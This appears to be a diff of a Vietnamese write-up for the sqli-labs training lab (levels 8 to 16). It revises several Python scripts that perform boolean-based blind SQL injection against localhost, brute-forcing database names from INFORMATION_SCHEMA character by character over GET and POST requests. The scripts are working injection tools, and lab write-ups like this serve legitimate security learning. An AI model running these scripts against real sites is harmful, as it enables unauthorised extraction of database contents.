@@ -307,8 +307,8 @@ Nếu ta làm tay thì khá là mất thời gian, vì vậy mình có viết 1 
 ```python
 import requests
 import string
-
-def get_length_dbs(url, comment):
+import sys
+def get_length(url, comment):
     for i in range(20,4,-1):
         r = requests.get(url + str(i) + comment).text
         # print(url + str(i) + comment)
@@ -325,6 +325,7 @@ def send(url):
 # alphabet = 'Ee3Tt7Aa@4Oo0Ii1!_NnSs5$HhRrDdLlCcUuMmWwFfGg6YyPpBbVvKkJjXxQqZz289{}"#%&\'()*+,-./:;<=>?[\\]^`|~ '
 alphabet = string.ascii_lowercase + '_'
 url = "http://localhost/Less-8/?id=1' and "
+#payload = "left((select database()),"
 payload_length_1 = "length((select schema_name FROM INFORMATION_SCHEMA.SCHEMATA limit "
 payload_length_2 = ",1))="
 payload1 = "left((select schema_name FROM INFORMATION_SCHEMA.SCHEMATA limit "
@@ -332,23 +333,28 @@ payload2 = ",1),"
 payload3 = ")='"
 comment = '--+'
 count = 1
-dbs = ""
-#length = (get_length_dbs("http://localhost/Less-8/?id=1'+and+length(database())=",'--+'))
+result = ""
+dbs = []
+#length = (get_length("http://localhost/Less-8/?id=1'+and+length(database())=",'--+'))
 
 for i in range(0,5):
-    length = get_length_dbs(url + payload_length_1 + str(i) + payload_length_2,comment)
+    length = get_length(url + payload_length_1 + str(i) + payload_length_2,comment)
     for j in range(length):
         for c in alphabet:
-            final_url = url + payload1 + str(i) + payload2 + str(count) + payload3 + (dbs+c) + "'" + comment
+            final_url = url + payload1 + str(i) + payload2 + str(count) + payload3 + (result+c) + "'" + comment
             # print(final_url)
             if send(final_url):
                 count += 1
-                dbs += c
-                # print(dbs)
-    print("[+] Found: Database {}. {}".format(i+1,dbs))
-    dbs = ""
+                result += c
+                # print(result)
+                sys.stdout.write(c)
+                sys.stdout.flush()
+    sys.stdout.write("\r\n")
+    sys.stdout.flush()
+    dbs.append(result)
+    result = ""
     count = 1
-
+print("[+] Found: List database: {}".format(dbs))
 ```
 
 ## Less-9 
@@ -397,8 +403,8 @@ Nên mình chỉ cần sửa [script](https://github.com/n9uyen/sqli-labs/blob/m
 ```python
 import requests
 import string
-
-def get_length_dbs(url, comment):
+import sys
+def get_length(url, comment):
     for i in range(20,4,-1):
         r = requests.get(url + str(i) + comment).text
         # print(url + str(i) + comment)
@@ -412,7 +418,6 @@ def send(url):
     else:
         return False
 
-# alphabet = 'Ee3Tt7Aa@4Oo0Ii1!_NnSs5$HhRrDdLlCcUuMmWwFfGg6YyPpBbVvKkJjXxQqZz289{}"#%&\'()*+,-./:;<=>?[\\]^`|~ '
 alphabet = string.ascii_lowercase + '_'
 url = "http://localhost/Less-9/?id=1' and "
 #payload = "left((select database()),"
@@ -423,21 +428,26 @@ payload2 = ",1),"
 payload3 = ")='"
 comment = '--+'
 count = 1
-dbs = ""
-
+result = ""
+dbs = []
 for i in range(0,5):
-    length = get_length_dbs(url + payload_length_1 + str(i) + payload_length_2,comment)
+    length = get_length(url + payload_length_1 + str(i) + payload_length_2,comment)
     for j in range(length):
         for c in alphabet:
-            final_url = url + payload1 + str(i) + payload2 + str(count) + payload3 + (dbs+c) + "'" + comment
+            final_url = url + payload1 + str(i) + payload2 + str(count) + payload3 + (result+c) + "'" + comment
             # print(final_url)
             if send(final_url):
                 count += 1
-                dbs += c
-                # print(dbs)
-    print("[+] Found: Database {}. {}".format(i+1,dbs))
-    dbs = ""
+                result += c
+                # print(result)
+                sys.stdout.write(c)
+                sys.stdout.flush()
+    sys.stdout.write("\r\n")
+    sys.stdout.flush()
+    dbs.append(result)
+    result = ""
     count = 1
+print("[+] Found: List database: {}".format(dbs))
 ```
 
 ## Less-10
@@ -473,8 +483,8 @@ $row = mysql_fetch_array($result);
 ```python
 import requests
 import string
-
-def get_length_dbs(url, comment):
+import sys
+def get_length(url, comment):
     for i in range(20,4,-1):
         r = requests.get(url + str(i) + comment).text
         # print(url + str(i) + comment)
@@ -488,7 +498,6 @@ def send(url):
     else:
         return False
 
-# alphabet = 'Ee3Tt7Aa@4Oo0Ii1!_NnSs5$HhRrDdLlCcUuMmWwFfGg6YyPpBbVvKkJjXxQqZz289{}"#%&\'()*+,-./:;<=>?[\\]^`|~ '
 alphabet = string.ascii_lowercase + '_'
 url = 'http://localhost/Less-10/?id=1" and '
 #payload = "left((select database()),"
@@ -499,21 +508,26 @@ payload2 = ",1),"
 payload3 = ")='"
 comment = '--+'
 count = 1
-dbs = ""
-
+result = ""
+dbs = []
 for i in range(0,5):
-    length = get_length_dbs(url + payload_length_1 + str(i) + payload_length_2,comment)
+    length = get_length(url + payload_length_1 + str(i) + payload_length_2,comment)
     for j in range(length):
         for c in alphabet:
-            final_url = url + payload1 + str(i) + payload2 + str(count) + payload3 + (dbs+c) + "'" + comment
+            final_url = url + payload1 + str(i) + payload2 + str(count) + payload3 + (result+c) + "'" + comment
             # print(final_url)
             if send(final_url):
                 count += 1
-                dbs += c
-                # print(dbs)
-    print("[+] Found: Database {}. {}".format(i+1,dbs))
-    dbs = ""
+                result += c
+                # print(result)
+                sys.stdout.write(c)
+                sys.stdout.flush()
+    sys.stdout.write("\r\n")
+    sys.stdout.flush()
+    dbs.append(result)
+    result = ""
     count = 1
+print("[+] Found: List database: {}".format(dbs))
 ```
 
 ## Less-11
@@ -669,8 +683,8 @@ Còn kết quả là `False` thì `Response` `<img src="../images/slap.jpg"  />`
 ```python
 import requests
 import string
-
-def get_length_dbs(url, data, comment):
+import sys
+def get_length(url, data, comment):
     headers = {"Content-Type": "application/x-www-form-urlencoded"}
     for i in range(20,4,-1):
         r = requests.post(url,data = data + str(i) + comment,headers=headers).text
@@ -686,7 +700,6 @@ def send(url,data):
     else:
         return False
 
-# alphabet = 'Ee3Tt7Aa@4Oo0Ii1!_NnSs5$HhRrDdLlCcUuMmWwFfGg6YyPpBbVvKkJjXxQqZz289{}"#%&\'()*+,-./:;<=>?[\\]^`|~ '
 alphabet = string.ascii_lowercase + '_'
 url = "http://localhost/Less-15/"
 data = "passwd=1&submit=Submit&uname=1' or  "
@@ -698,21 +711,27 @@ payload2 = ",1),"
 payload3 = ")='"
 comment = '--+'
 count = 1
-dbs = ""
+result = ""
+dbs = []
 
 for i in range(0,5):
-    length = get_length_dbs(url, data + payload_length_1 + str(i) + payload_length_2,comment)
+    length = get_length(url, data + payload_length_1 + str(i) + payload_length_2,comment)
     for j in range(length):
         for c in alphabet:
-            final_url = data + payload1 + str(i) + payload2 + str(count) + payload3 + (dbs+c) + "'" + comment
+            final_url = data + payload1 + str(i) + payload2 + str(count) + payload3 + (result+c) + "'" + comment
             # print(final_url)
             if send(url, final_url):
                 count += 1
-                dbs += c
-                # print(dbs)
-    print("[+] Found: Database {}. {}".format(i+1,dbs))
-    dbs = ""
+                result += c
+                # print(result)
+                sys.stdout.write(c)
+                sys.stdout.flush()
+    sys.stdout.write("\r\n")
+    sys.stdout.flush()
+    dbs.append(result)
+    result = ""
     count = 1
+print("[+] Found: List database: {}".format(dbs))
 ```
 
 ## Less-16
@@ -730,8 +749,9 @@ Câu này cách giải tương tự câu 15, thay vì `Single quotes` như câu 
 ```python
 import requests
 import string
+import sys
 
-def get_length_dbs(url, data, comment):
+def get_length(url, data, comment):
     headers = {"Content-Type": "application/x-www-form-urlencoded"}
     for i in range(20,4,-1):
         r = requests.post(url,data = data + str(i) + comment,headers=headers).text
@@ -759,21 +779,27 @@ payload2 = ",1),"
 payload3 = ")='"
 comment = '--+'
 count = 1
-dbs = ""
+result = ""
+dbs = []
 
 for i in range(0,5):
-    length = get_length_dbs(url, data + payload_length_1 + str(i) + payload_length_2,comment)
+    length = get_length(url, data + payload_length_1 + str(i) + payload_length_2,comment)
     for j in range(length):
         for c in alphabet:
-            final_url = data + payload1 + str(i) + payload2 + str(count) + payload3 + (dbs+c) + "'" + comment
+            final_url = data + payload1 + str(i) + payload2 + str(count) + payload3 + (result+c) + "'" + comment
             # print(final_url)
             if send(url, final_url):
                 count += 1
-                dbs += c
-                # print(dbs)
-    print("[+] Found: Database {}. {}".format(i+1,dbs))
-    dbs = ""
+                result += c
+                # print(result)
+                sys.stdout.write(c)
+                sys.stdout.flush()
+    sys.stdout.write("\r\n")
+    sys.stdout.flush()
+    dbs.append(result)
+    result = ""
     count = 1
+print("[+] Found: List database: {}".format(dbs))
 ```
 
 ## Less-17
